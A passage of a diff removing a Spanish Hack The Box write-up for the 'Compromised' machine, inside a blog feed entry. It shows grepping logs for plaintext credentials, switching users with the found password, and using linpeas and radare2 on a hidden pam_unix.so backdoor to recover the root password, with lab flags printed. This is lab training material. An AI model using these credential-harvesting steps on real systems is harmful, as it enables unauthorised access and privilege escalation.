-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez dentro como el usuario &lt;code&gt;mysql&lt;/code&gt;, vamos a buscar de manera recursiva por la palabra &lt;code&gt;sysadmin&lt;/code&gt;, encontramos un archivo &lt;code&gt;lib/mysql/strace-log.dat&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ grep -ri &quot;sysadmin&quot; 2&amp;gt;/dev/null
-log/cloud-init.log:2020-05-08 15:50:07,874 - __init__.py[DEBUG]: Adding user sysadmin
-log/cloud-init.log:2020-05-08 15:50:07,874 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'sysadmin', '--comment', 'compromise', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
-log/cloud-init.log:2020-05-08 15:50:31,366 - cc_ssh_import_id.py[DEBUG]: User sysadmin is not configured for ssh_import_id
-log/cloud-init-output.log:ci-info: no authorized SSH keys fingerprints found for user sysadmin.
-log/installer/subiquity-debug.log.2150:2020-05-08 15:33:28,872 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'compromise', 'realname': 'compromise', 'username': 'sysadmin', 'password': '&amp;lt;REDACTED&amp;gt;'}
-lib/dpkg/info/systemd.postinst:# runtime-dir/sysadmin-dir/other packages (e.g. rsyslog)
-lib/dpkg/info/dash.postinst:		# The sysadmin wants it this way.  Who am I to argue?
-lib/dpkg/info/libssl1.0.0:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
-lib/dpkg/info/libssl1.1:amd64.postinst:	# update for a security issue, but planned by the sysadmin, not
-lib/dpkg/info/irqbalance.postinst:    # things the local sysadmin has added to the old /etc/default/irqbalance
-lib/dpkg/info/irqbalance.postinst:        # Insert a header to help sysadmin figure out why these things are here.
-lib/dpkg/info/irqbalance.postinst:        # been added to the file by the local sysadmin.
-lib/dpkg/status: Sudo is a program designed to allow a sysadmin to give limited root
-lib/dpkg/status: You should install ltrace if you need a sysadmin tool for tracking the
-lib/dpkg/status: common Linux/UNIX commands, reducing the amount of typing sysadmins
-lib/dpkg/status-old: Sudo is a program designed to allow a sysadmin to give limited root
-lib/dpkg/status-old: You should install ltrace if you need a sysadmin tool for tracking the
-lib/dpkg/status-old: common Linux/UNIX commands, reducing the amount of typing sysadmins
-lib/mysql/strace-log.dat:22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-lib/mysql/strace-log.dat:22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-lib/mysql/strace-log.dat:22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
-lib/mysql/strace-log.dat:22227 03:11:09 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7fff97cc5590) = -1 ENOENT (No such file or directory)
-lib/mysql/strace-log.dat:22102 03:11:09 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
-lib/mysql/strace-log.dat:22228 03:11:15 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffdc5cfb790) = -1 ENOENT (No such file or directory)
-lib/mysql/strace-log.dat:22102 03:11:15 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.my.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
-lib/mysql/strace-log.dat:22229 03:11:18 stat(&quot;/home/sysadmin/.mylogin.cnf&quot;, 0x7ffcd3f055a0) = -1 ENOENT (No such file or directory)
-lib/mysql/strace-log.dat:22229 03:11:18 readlink(&quot;/home/sysadmin/.mysql_history&quot;, 0x7ffcd3f0a390, 511) = -1 ENOENT (No such file or directory)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Leemos el archivo y filtramos por &lt;code&gt;sysadmin y password&lt;/code&gt;, para tratar de encontrar credenciales en texto claro.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ cat lib/mysql/strace-log.dat | grep -iE &quot;sysadmin|password&quot;
-22102 03:10:59 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-22102 03:11:00 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-22102 03:11:03 write(2, &quot;\33]0;sysadmin@compromised: /opt\7\33&quot;..., 84) = 84
-22102 03:11:06 write(2, &quot;mysql -u root --password='3*NLJE&quot;..., 39) = 39
-22227 03:11:09 execve(&quot;/usr/bin/mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password=3*NLJE32I$Fe&quot;], 0x55bc62467900 /* 21 vars */) = 0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Encontramos una credencial que si la validamos corresponde al usuario &lt;code&gt;sysadmin&lt;/code&gt;, ahora podemos ir a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mysql@compromised:/var$ su sysadmin
-Password: 
-sysadmin@compromised:/var$ whoami
-sysadmin
-sysadmin@compromised:/var$ cd /home/sysadmin/
-sysadmin@compromised:~$ cat user.txt 
-e0915cc0811946d4d341100789b6592e
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Como la maquina se llama &lt;code&gt;compromised&lt;/code&gt;, nos da una pista de que la maquina previamente ya fue comprometida, por lo tanto puedo pensar que para garantia de una escalada de privilegios se pudo dejar un &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Rootkit: Un rootkit es un tipo de software malicioso diseñado para dar la capacidad de introducirse en un dispositivo y hacerse con el control del mismo. Por lo general, los rootkits afectan el software o el sistema operativo del dispositivo que infectan, pero algunos pueden actuar sobre su hardware o firmware. Los rootkits operan en segundo plano, sin dar muestras de que están activos.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Para poder detectarlo vamos a usar &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&quot;&gt;https://github.com/carlospolop/PEASS-ng/releases/tag/20230611-b11e87f7&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ejecutamos el &lt;code&gt;linpeas&lt;/code&gt; y encontramos que &lt;code&gt;.pam_unix.so&lt;/code&gt; se encuentra oculto.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;pam_unix.so: Este es el módulo estándar de autenticación de Unix. Utiliza llamadas estándar de las bibliotecas del sistema para recuperar y establecer la información de la cuenta, así como la autenticación. Usualmente esto se obtiene del archivo /etc/passwd y del archivo /etc/shadow también si shadow está habilitado.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Como vemos el &lt;code&gt;pam_unix&lt;/code&gt; toca temas de autenticación, vamos a traernoslo a nuestro equipo y analizarlo. Para ello vamos a hacer un bae64 del archivo y decodearlo en nuestro equipo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ base64 -w 0 .pam_unix.so; echo
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez tengamos el archivo en nuestro equipo vamos a examinarlo con &lt;code&gt;radare2&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file pam_unix.so
-pam_unix.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=52d069272a0900ed4963258eab93237d38c6d1c4, with debug_info, not stripped
-❯ radare2 pam_unix.so
-Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
- -- Select your architecture with: 'e asm.arch=&amp;lt;arch&amp;gt;' or r2 -a from the shell
-[0x000025c0]&amp;gt; aaa
-[x] Analyze all flags starting with sym. and entry0 (aa)
-[x] Analyze all functions arguments/locals
-[x] Analyze function calls (aac)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Finding and parsing C++ vtables (avrr)
-[x] Type matching analysis for all functions (aaft)
-[x] Propagate noreturn information (aanr)
-[x] Integrate dwarf function information.
-[x] Use -AA or aaaa to perform additional experimental analysis.
-[0x000025c0]&amp;gt; afl
-0x000025c0    4 50   -&amp;gt; 40   entry0
-0x00002c70   28 732  -&amp;gt; 681  dbg.pam_sm_acct_mgmt
-0x00002f70   34 670  -&amp;gt; 633  dbg.pam_sm_authenticate
-0x00004390   13 222  -&amp;gt; 210  dbg.pam_sm_close_session
-0x00003210    6 116          dbg.pam_sm_setcred
-0x00003750  104 2863 -&amp;gt; 2805 dbg.pam_sm_chauthtok
-0x00004280   13 262  -&amp;gt; 256  dbg.pam_sm_open_session
-[0x000025c0]&amp;gt; s dbg.pam_sm_authenticate
-[0x00002f70]&amp;gt; pdf
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Analizando vemos una intrucción que hace referencia a &lt;code&gt;pam_unix_auth.c&lt;/code&gt;, con lo que parece ser una credencial, en dos partes similar al formato de una credencial que previamente obtuvimos &lt;code&gt;zlke~U3Env82m2-&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Compromissed/compro15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Validamos y efectivamente la credencial corresponde al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sysadmin@compromised:/lib/x86_64-linux-gnu/security$ su root
-Password: 
-root@compromised:/lib/x86_64-linux-gnu/security# whoami
-root
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@compromised:/lib/x86_64-linux-gnu/security# cd /root/
-root@compromised:~# cat root.txt 
-e62293eadbdb5c168b024782d6943394
-&lt;/code&gt;&lt;/pre&gt;
-</description>
-        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Compromissed</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Compromissed</guid>
-        
-        <category>Information leaked</category>
-        
-        <category>bypass disable functions php</category>
-        
-        <category>litecart exploit</category>
-        
-        <category>tty interactive</category>
-        
-        <category>enumeration sql</category>
-        
-        <category>UDF</category>
-        
-        <category>log filter</category>
-        
-        <category>rootkit</category>
-        
-        <category>linpeas</category>
-        
-        <category>pamunix</category>
         
         
         <category>hackthebox</category>
